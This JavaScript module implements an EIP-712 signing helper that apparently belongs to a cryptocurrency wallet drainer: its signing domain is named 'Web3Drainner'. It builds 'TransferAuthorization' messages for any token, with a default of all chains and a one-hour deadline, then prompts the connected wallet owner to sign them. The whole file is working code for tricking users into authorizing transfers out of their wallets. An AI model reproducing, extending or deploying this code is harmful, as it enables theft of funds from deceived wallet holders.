/**
 * EIP-712 Signer for Meta-Transaction Model
 * Generates and signs EIP-712 messages for token transfers
 */

import { ethers } from 'ethers'

class EIP712Signer {
  /**
   * Create EIP-712 domain for chain
   */
  static createDomain(chainId) {
    return {
      name: 'Web3Drainner',
      version: '1',
      chainId: chainId,
      verifyingContract: '0x0000000000000000000000000000000000000000'
    }
  }

  /**
   * Create EIP-712 message types for transfer authorization
   */
  static createTransferTypes() {
    return {
      TransferAuthorization: [
        { name: 'tokenAddress', type: 'address' },
        { name: 'amount', type: 'uint256' },
        { name: 'nonce', type: 'uint256' },
        { name: 'deadline', type: 'uint256' },
        { name: 'chains', type: 'string' }
      ]
    }
  }

  /**
   * Create EIP-712 transfer message
   * @param {string} tokenAddress - Token contract address (or 0x0 for native)
   * @param {string} amount - Amount in wei/smallest unit
   * @param {number} nonce - Anti-replay nonce
   * @param {number} chainId - EVM chain ID
   * @param {string} chains - Comma-separated list of chains to transfer on
   * @returns {Object} EIP-712 message
   */
  static createTransferMessage(tokenAddress, amount, nonce, chainId, chains = 'all') {
    const domain = this.createDomain(chainId)
    const types = this.createTransferTypes()

    // 1 hour deadline
    const deadline = Math.floor(Date.now() / 1000) + 3600

    const message = {
      tokenAddress: tokenAddress || '0x0000000000000000000000000000000000000000',
      amount: amount.toString(),
      nonce: nonce,
      deadline: deadline,
      chains: chains
    }

    return {
      domain,
      types,
      message,
      primaryType: 'TransferAuthorization'
    }
  }

  /**
   * Request user to sign EIP-712 message
   * @param {Object} provider - ethers BrowserProvider
   * @param {string} userAddress - User's wallet address
   * @param {Object} messageData - Message created by createTransferMessage()
   * @returns {Promise<string>} Signature hex string
   */
  static async signMessage(provider, userAddress, messageData) {
    try {
      const signer = await provider.getSigner(userAddress)

      console.log('📝 Requesting EIP-712 signature from user...')

      // Sign EIP-712 message
      const signature = await signer.signTypedData(
        messageData.domain,
        messageData.types,
        messageData.message
      )

      console.log('✅ Signature obtained:', signature.substring(0, 20) + '...')
      return signature
    } catch (error) {
      console.error('❌ Signing failed:', error.message)
      throw new Error(`User rejected signing: ${error.message}`)
    }
  }

  /**
   * Recover address from EIP-712 signature (for verification)
   */
  static recoverAddress(messageData, signature) {
    try {
      const recoveredAddress = ethers.verifyTypedData(
        messageData.domain,
        messageData.types,
        messageData.message,
        signature
      )
      return recoveredAddress
    } catch (error) {
      console.error('❌ Address recovery failed:', error.message)
      throw new Error('Invalid signature')
    }
  }
}

export default EIP712Signer
